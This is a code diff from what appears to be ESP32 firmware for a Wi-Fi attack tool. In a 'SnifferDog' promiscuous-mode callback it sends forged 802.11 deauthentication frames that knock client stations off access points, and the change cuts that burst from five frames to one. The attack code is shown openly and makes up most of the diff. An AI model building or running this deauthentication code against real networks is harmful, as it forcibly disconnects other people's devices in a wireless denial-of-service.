@@ -238,6 +238,7 @@ void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
 
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
     if (err == ESP_ERR_NO_MEM) {
+        //give it a breath:
         vTaskDelay(pdMS_TO_TICKS(20));
         MY_LOG_INFO(TAG, "esp_wifi_80211_tx returned ESP_ERR_NO_MEM: %d", heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
         return; // lub ponów próbę później
@@ -4917,23 +4918,20 @@ static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_typ
     // Set BSSID to AP
     memcpy(&deauth_frame[16], ap_mac, 6);
     
-    // Send 5 deauth frames for more effective disconnection
+    // Send deauth frame for more effective disconnection
 
     // Blue LED flash to indicate deauth sent
     led_strip_set_pixel(strip, 0, 0, 0, 255); // Blue
     led_strip_refresh(strip);
 
-    for (int i = 0; i < 5; i++) {
-        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-        vTaskDelay(pdMS_TO_TICKS(50));
-    }
+    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
     deauth_sent_count++;
     
     led_strip_set_pixel(strip, 0, 255, 0, 0); // Back to red
     led_strip_refresh(strip);
     
     // Log statistics for this AP-STA pair
-    MY_LOG_INFO(TAG, "[SnifferDog #%lu] 5x DEAUTH sent: AP=%02X:%02X:%02X:%02X:%02X:%02X -> STA=%02X:%02X:%02X:%02X:%02X:%02X (Ch=%d, RSSI=%d)",
+    MY_LOG_INFO(TAG, "[SnifferDog #%lu] DEAUTH sent: AP=%02X:%02X:%02X:%02X:%02X:%02X -> STA=%02X:%02X:%02X:%02X:%02X:%02X (Ch=%d, RSSI=%d)",
                deauth_sent_count,
                ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
                sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5],
